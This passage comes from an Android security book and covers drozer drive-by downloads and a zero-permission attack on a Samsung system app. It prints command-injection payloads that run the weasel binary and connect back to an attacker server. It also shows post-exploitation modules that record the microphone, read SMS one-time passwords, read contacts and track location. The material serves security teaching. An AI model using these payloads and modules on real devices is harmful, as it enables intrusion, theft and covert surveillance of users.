Other examples of attacks using BROWSABLE activities exist. Some of them may require additional
interception of responses and even DNS spoofing attacks. However, the fact remains that BROWSABLE
activities are an excellent entry point into a device and have application for real-world practical attacks.
Malware
The intention of a malware author could vary wildly. Malware can also be distributed in a number of ways. The
majority of techniques used by malware authors are not sophisticated. Some of the more sophisticated malware
preys on people's greediness by offering paid applications that are “cracked” to remove checks for the validity of
the purchase. This is a clever way to incorporate malware inside these applications. However, in this section we
only explore two scenarios:
Improving the drive-by download attack with social engineering
Using a zero permission application to install additional packages
Drive-By Downloads
Website owners with questionable morals or who have suffered a compromise may be serving Android
applications that automatically download when you visit their site. This is known as a drive-by download. In the
case of Android, this is a pure social engineering attack against the user. The website may try to trick the user
into installing the application by displaying messages about a missing plug-in or a mobile application
replacement instead of visiting the website in a browser. However it is worded, the premise of the attack
remains the same: The user has to install the downloaded APK. Installing an application in this way requires a
setting named “Unknown Sources” to be checked in the settings. All this setting does is control whether the user
can open an APK in the Package Installer activity or not. Contrary to popular belief, it has no bearing on any
other techniques used to install additional APKs that are not from the Play Store.
This example examines how to perform this attack using the drozer exploit at
exploit.remote.socialengineering.unknownsources. The pages that serve a rogue drozer agent and the actual
APK can be pushed to a drozer server listening on port 80 as follows:
$ drozer exploit build exploit.remote.socialengineering.unknownsources
--server 192.168.1.112:80 --resource /
Uploading blank page to /... [ OK ]
Uploading agent to /plug-in.apk... [ OK ]
Uploading web delivery page to /... [ OK ]
Done. Exploit delivery page is available on: http://192.168.1.112:80/
This uploads the page that serves the download from the web root and in this instance can be accessed by
visiting http://192.168.1.112 from an Android phone. This example visits this site both from an Android phone
running an older version of the Android browser and a device running KitKat with the most updated Google
Chrome browser. We will note the improvements made to the security model and how they affect this attack.
Malware authors who relied on drive-by downloads often made use of the RECEIVE_BOOT_COMPLETED permission
in their application manifest because it was a reliable way to invoke the application after it had been installed.
Applications that catch the BOOT_COMPLETED intent allow the application to be started when the phone boots up.
This ensures that at some stage the malware will be run even if the user does not ever start up the newly
installed application. Visiting the drozer server from an Android 2.3 device, downloading and installing the
package, and then rebooting the device results in a session being received when BOOT_COMPLETED is received. Also
notice that the download is initiated automatically and never asks whether the user would like to download it.
Using the BOOT_COMPLETED invocation method on older versions of Android is reliable but who wants to wait
until the user reboots her device to receive a session? To invoke an application automatically after the APK has
been downloaded, the drozer module loads an iframe with src="pwn://lol" that constantly gets refreshed. This
means that on an Android 2.3 device, installing the APK immediately yields a session on the drozer server:
2014-11-14 01:19:49,430 - drozer.server.protocols.http - INFO - GET /
2014-11-14 01:19:49,555 - drozer.server.protocols.http - INFO - GET
/favicon.ico
2014-11-14 01:19:51,572 - drozer.server.protocols.http - INFO - GET
/plug-in.apk
2014-11-14 01:19:52,320 - drozer.server.protocols.http - INFO - GET
/plug-in.apk
2014-11-14 01:21:24,775 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 4abaa41aed56c78f
Since Android 3.1, a newly installed application does not receive the BOOT_COMPLETED intent unless some
component of its code has been invoked by the user because of its “inactive” state. This stumped many malware
authors and this technique now seems less prevalent since this addition. However, this attack is still very much
alive using something like drozer's pwn:// handler. Automatic invocation takes place on all Android devices
running Chromium versions 24 or less.
This attack on an Android 4.4 device running the latest version of Google Chrome is somewhat different.
Chrome does not allow the automatic download of the APK. It prompts users whether they would like the APK
to download and issues a warning that downloading an APK may be dangerous. If a user ignores this and installs
the APK, automatically invoking the newly installed application by using an iframe is not possible. A link would
need to be provided that the user clicks that loads from a pwn:// address. This is slightly less convenient but still
a completely valid attack vector. Figure 8.11 shows the page on a KitKat device where a user would have to click
the “reload” button to invoke the newly installed drozer agent.
Figure 8.11 The drozer exploit page attempting to perform social engineering to get the user to click the reload
button
Requesting Zero Permissions
A clever malware author could create an application that requests no permissions at all and abuses
vulnerabilities in devices to install additional packages or compromise applications in another way. There is a
huge scope for attacking other applications without having any particular permissions, as was explored in
Chapter 7. Assuming that the ultimate goal of an application requesting zero permissions is to install an
additional package, this additional package could then request all available permissions and allow the
infiltration of user data to a larger degree. Obtaining the ability to install an additional package without
permissions is considered “breaking out of the sandbox.” As you have seen, sandbox is a loose term.
Nonetheless, the implementation of the Android security model in the device would be broken if you could do
this.
A reliable technique would be to include publicly available kernel exploits inside the application. Targeting these
exploits correctly according to the device could bring success to the malware author. With root access, installing
an additional package would certainly be possible. Let us explore an interesting example of a vulnerability in a
pre-installed application on a Samsung Galaxy S3 with the package name com.sec.android.app.servicemodeapp.
This application has a sharedUserId set to android.uid.system in its manifest. André Moulu from QuarksLab
discovered that this application had a command injection vulnerability in one of its broadcast receivers that
allows for execution of arbitrary commands as the system user. A simplified version of the code that performs a
basic Runtime.getRuntime().exec() is as follows:
FTATDumpService.this.DoShellCmd("dumpstate > /data/log/" + str + ".log")
Where str is controlled by an extra as part of the Intent passed from the broadcast receiver with the key
FILENAME. The proof of concept shown by André simply wrote a file to the SD card:
$ adb shell am broadcast -a com.android.sec.FTAT_DUMP --es FILENAME
`../../../../../dev/null;/system/bin/id > /sdcard/shellescape;'
Broadcasting : Intent { act=com.android.sec.FTAT_DUMP (has extras) }
Broadcast completed : result=0
You can find more information about this vulnerability in his presentation at
http://www.quarkslab.com/dl/Android-OEM-applications-insecurity-and-backdoors-without-
permission.pdf. This could have been used to devastating ends by a malware author. Now we'll get this
application to execute weasel as a proof of concept and show what exploitation of this issue allows. Perform the
following steps:
1. Start a drozer server on an Internet-facing machine.
2. Build a rogue drozer agent and upload it to the server as follows:
$ drozer agent build --server 192.168.1.112:80 --rogue
Done: /tmp/tmp2bd94X/agent.apk
$ drozer server upload /agent.apk /tmp/tmp2bd94X/agent.apk
--server 192.168.1.112:80
3. Bundle weasel inside an application with zero permissions. You find the weasel binary inside drozer at
/src/drozer/lib/weasel/armeabi/w.
4. When the application is first run, copy weasel to your application's data directory and mark it as world
readable.
5. Send a broadcast with the following parameters:
Action: com.android.sec.FTAT_DUMP
Extra string named 'FILENAME':
../../../../../dev/null; cd
/data/data/com.sec.android.app.servicemodeapp;cat
/data/data/my.evil.application/w > w;
chmod 770 w; ./w 192.168.1.112 80;#
This injects perfectly to complete the command and copy weasel from your application's data directory,
mark it executable, and run it with your Internet-facing server as its arguments. This results in the
following sessions shown in your drozer server log:
2014-11-15 20:10:54,037 - drozer.server.protocols.shell - INFO -
accepted shell from 192.168.1.109:58585
2014-11-15 20:10:54,134 - drozer.server.protocols.http - INFO - GET
/agent.jar
2014-11-15 20:10:54,136 - drozer.server.protocols.http - INFO - GET
/agent.apk
2014-11-15 20:10:56,025 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from a4cjgha9cn2ic
2014-11-15 20:11:01,331 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 1b6b125f54bdda30
Querying the server reveals that you received two drozer sessions from this command: one with Context and the
other one likely without, because it used the app_process method to load drozer:
$ drozer console devices --server 192.168.1.112:80
List of Bound Devices
Device ID Manufacturer Model Software
1b6b125f54bdda30 samsung GT-I9300 4.0.4
a4cjgha9cn2ic samsung GT-I9300 4.0.4
Session 1b6b125f54bdda30 is an installed drozer agent that was possible because weasel was loaded inside the
vulnerable application, which was running as the system user. The session a4cjgha9cn2ic would still be running
as the system user itself but would not have Context. This is very interesting as this allows a huge degree of
control over the device from within a drozer session! Connecting to this session confirms that we are indeed
running as the system user but do not have Context:
$ drozer console connect a4cjgha9cn2ic --server 192.168.1.112:80
.. ..:.
..o.. .r..
..a.. . ....... . ..nd
ro..idsnemesisand..pr
.otectorandroidsneme.
.,sisandprotectorandroids+.
..nemesisandprotectorandroidsn:.
.emesisandprotectorandroidsnemes..
..isandp,..,rotectorandro,..,idsnem.
.isisandp..rotectorandroid..snemisis.
,andprotectorandroidsnemisisandprotec.
.torandroidsnemesisandprotectorandroid.
.snemisisandprotectorandroidsnemesisan:
.dprotectorandroidsnemesisandprotector.
drozer Console (v2.3.4)
dz-limited> permissions
Has ApplicationContext: NO
dz-limited> shell
system@android:/data/data/com.sec.android.app.servicemodeapp $ id
uid=1000(system) gid=1000(system) groups=1001(radio),1006(camera),
1007(log),1015(sdcard_rw),1023(media_rw),2001(cache),
3001(net_bt_admin),3002(net_bt),3003(inet),3007(net_bw_acct)
You can use this access to install additional APKs or perform other post-exploitation techniques, which are
discussed later in the section, “Infiltrating User Data.”
TIP
Inside the drozer console are environment variables that can be controlled by the user. You find them by
typing env as follows:
dz-limited> env
PATH=/data/data/com.sec.android.app.servicemodeapp/bin:/sbin:
/vendor/bin:/system/sbin:/system/bin:/system/xbin
WD=/data/data/com.sec.android.app.servicemodeapp
Sometimes when you use the drozer JAR agent to get a session, it cannot correctly determine the exploited
application's private data directory. It is crucial for the functioning of drozer to have a directory that it can
read and write temporary files to. If you are in a drozer session and it is not behaving correctly and
throwing errors, check the working directory (WD) environment variable. If required, set it manually to a
directory where you know you have access.
For the previous example, you can use the following code and have drozer still work correctly:
dz-limited> set WD=/data/data/com.android.systemui
This is possible because the com.android.systemui application also uses a sharedUserId of
android.uid.system, which means that they both get assigned a UID of 1000 (system). If you recall from
the “Application Sandbox” section in Chapter 6, applications making use of sharedUserId's can access each
other's private data directory. The WD environment variable affects many areas of code and needs to be
correct. It also controls in what directory you are initially based when using the shell:
dz-limited> shell
system@android:/data/data/com.android.systemui $
This example may seem outdated; however, the fundamental concepts are absolutely relevant to the latest
devices. A more recent example that works on Android 4.4 devices and prior is the ObjectInputStream
vulnerability detailed in CVE-2014-7911. An exploit can make use of this vulnerability to attack the system
service and gain code execution as the system user. More information about the vulnerability can be found at
http://seclists.org/fulldisclosure/2014/Nov/51.
Another technique that malware could use to inject itself into other applications is using Google Bug #13678484
—the “Fake ID” Vulnerability. This was presented at Blackhat USA 2014 by Jeff Forristal of Bluebox Security.
It was discovered that the functions used to perform validation that a certificate is actually signed by its issuer
was non-existent. This lead to application certificates being able to claim that they were signed by a specific
certificate when they were not. This is generally not a problem for the installation of Android applications, as
the issuer of a certificate is never checked. However, this is a problem in the few instances where the issuer is
checked. One of these instances is WebView plug-ins. WebView plug-ins get loaded into all applications that
contain a WebView and have plug-ins enabled. Android is only supposed to acknowledge an application as
containing a valid plug-in if it was signed by the Adobe certificate. However, by including the Adobe public
certificate as well as a developer certificate with an Issuer field claiming to be signed by “Adobe Systems
Incorporated” in the same chain, the system would accept that it has been signed by Adobe.
As part of Jeff's demo, he created a malicious WebView plug-in that included a connect-back to a drozer server
from each of the infected applications. No permissions are required at all for this attack as your code is loaded
into other applications and you would assume the permissions of the infected applications. This attack works
only on Android 4.3 and earlier due to the change in the WebView plug-in code that was present in later
versions. For more information about this vulnerability and exploitation techniques, watch his presentation at
http://www.youtube .com/watch?v=MDjvyr_B8WU or visit Bluebox Security's technical blog at
https://bluebox.com/technical/blackhat-fake-id-talk-material-and-follow-up/.
Infiltrating User Data
Many post-exploitation tricks can be done on an Android device. This section presents a fraction of these that
readers may find interesting and easy to perform.
Using Existing drozer Modules
This section presents some of the available drozer modules that exist in the repository at the time of writing to
perform common post-exploitation tasks. To install the entire host of available post-exploitation modules,
perform module install post inside the drozer console or by using the drozer module option from outside the
console. To write your own drozer modules, review the available documentation at
https://github.com/mwrlabs/drozer/wiki#drozer- developers and ask questions in the Issue Tracker if
anything is unclear.
Record Microphone
It is possible to record from the microphone of the device you have compromised. The requirements are that
you have compromised an application with the RECORD_AUDIO permission and have retained Context. You could
also do this by installing a rogue drozer agent that satisfies these requirements by default. Running the module
provides the following output:
dz> run post.capture.microphone /path/to/save/recording.3gp
[*] Performing crazy reflection gymnastics
[*] Preparing recorder attributes
[+] Recording started
[+] Press [Enter] to stop recording
[+] Stopped...downloading recording
[+] Done.
This module saves the recording using the 3GP file format, which is heavily compressed. This means it is
efficient on storage and bandwidth.
Read and Send SMS Messages
SMS messages can be read and new messages sent with the appropriate access on a device. Reading SMS
messages could be used by an advanced attacker to overcome the use of two-factor authentication that uses OTP
tokens sent via SMS. This solution is common in the banking world. To read all SMS messages containing the
word “OTP,” you could run the following command:
dz> run post.sms.read -f OTP
| body | date_sent | address | person |
...
| Your bank:-) You are about to make a Once Off payment of R250.00 to
...779823 at Other Bank. Confirmation OTP:1458 | 1415265937000 |
+27820070194 | null |
You send an SMS as follows:
dz> run post.sms.send 0745678323 "My message text"
Sent SMS.
Using these modules requires the installation of a rogue drozer agent or the compromise of an application
holding the READ_SMS or SEND_SMS permissions, respectively, with Context retained.
Read Contacts
Similarly to the post.read.sms module shown in the previous example, reading stored contacts on the device is
possible with a search filter. The search filter includes the contact's name and number. Here is an example of
searching by someone's surname:
dz> run post.contacts.read -f snowden
| Edward Snowden | +7 922 555-12-34 |
This module has the same requirements as reading SMS messages except that it needs the READ_CONTACTS
permission.
User GPS Location
Most Android devices have GPS features available. Even those that do not can perform various techniques such
as cellphone tower triangulation or Wi-Fi hotspot proximity markers to determine the user's rough location.
These can be used by the post.capture.location module to determine a user's last known location:
dz> run post.capture.location
Latitude, Longitude: 63.585483,100.626953
Google Maps link: https://www.google.com/maps/place/63.585483,100.626953
This module has the same requirements as the previous modules presented except that it needs either the
ACCESS_COARSE_LOCATION or ACCESS_FINE_LOCATION permissions to function. On Android 4.4 and above this
module also may require the Location Services to be enabled by the user.
Capturing the User's Screen
What a user does on his device is very personal. An unknown party being able to take screenshots or record
videos of his activities is the ultimate infringement of privacy. Take a look at how to take screenshots on a